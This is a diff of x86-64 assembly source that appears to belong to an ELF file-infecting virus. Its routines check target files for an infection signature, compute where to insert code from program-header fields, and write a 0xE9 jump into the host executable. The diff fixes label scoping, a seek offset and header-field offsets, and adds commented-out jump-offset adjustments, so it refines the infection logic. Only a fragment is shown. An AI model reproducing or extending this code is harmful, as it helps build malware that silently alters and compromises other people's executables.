@@ -405,7 +405,7 @@ ft_strstr:
 checkSignature:
 	sub    rsp,0x1010
 	mov    [rsp],rdi
-checkSignature.do:
+.checkSignature.do:
 	mov    r8,rsi
 	xor    rax,rax
 	mov    rdi,[rsp]
@@ -418,17 +418,17 @@ checkSignature.do:
 	lea    rdi,[rsp+0x10]
 	call   ft_strstr
 	cmp    rax,1
-	je     checkSignature.endTrue
+	je     .checkSignature.endTrue
 	cmp    qword [rsp+0x8],0
-	jg     checkSignature.do
+	jg     .checkSignature.do
 	mov    r8, rsi
 	mov    rdi, [rsp]
-	mov    rsi, 75
+	mov    rsi, 300
 	mov    rdx, 0
 	mov    rax, 8
 	syscall
 	mov    rsi, r8
-checkSignature.doudou:
+.checkSignature.doudou:
 	mov    r8,rsi
 	xor    rax,rax
 	mov    rdi,[rsp]
@@ -441,14 +441,14 @@ checkSignature.doudou:
 	lea    rdi,[rsp+0x10]
 	call   ft_strstr
 	cmp    rax,1
-	je     checkSignature.endTrue
+	je     .checkSignature.endTrue
 	cmp    qword [rsp+0x8],0
-	jg     checkSignature.doudou
+	jg     .checkSignature.doudou
 	xor    rax,rax
-	jmp    checkSignature.end
-checkSignature.endTrue:
+	jmp    .checkSignature.end
+.checkSignature.endTrue:
 	mov    eax,0x1
-checkSignature.end:
+.checkSignature.end:
 	add    rsp,0x1010
 	ret
 
@@ -668,6 +668,17 @@ addJump:
 	mov    QWORD [rsp+0x8],rdx
 	xor    edx,edx
 	sub    QWORD [rsp+0x8],0x4
+	; mov    rdx, rsi
+	; add    rdx, QWORD [rsp+0x8]
+	; xor rdx,rdx
+; 	mov    rdx, QWORD [rsp+0x8]
+; 	add    rdx,QWORD [r15+0x18] 
+; 	and	   rdx, 0x10
+; 	jz     .addJump.end
+; .addJump.ajustOffset:
+; 	mov    BYTE [rsp+0xf], 0
+; .addJump.end:
+; 	xor    rdx,rdx
 	mov    BYTE [rsp+0x1f],0xe9
 	call   ft_syscall
 	lea    rsi,[rsp+0x1f]
@@ -684,6 +695,7 @@ addJump:
 	call   ft_syscall
 	add    rsp,0x20
 	pop    rbp
+	pop    r15
 	ret    
 insertCode:
 	push   r15
@@ -723,7 +735,7 @@ insertCode:
 	mov    rsi,QWORD [rbx+0x28]
 	mov    edi,r13d
 	sub    rdx,0x9a					; - 0x9a (sign + _start+93)
-	sub    rdx,QWORD [rbx+0x08]     ; - p_addr
+	sub    rdx,QWORD [rbx+0x18]     ; - p_addr
 	sub    rdx,rsi                  ; - p_memsiz
 	dec    rdx
 	add    rsi,QWORD [rbx+0x8]
@@ -733,7 +745,7 @@ insertCode:
 	pop    r12
 	pop    r13
 	pop    r14
-	pop    r15
+	
 	jmp    addJump
 
 
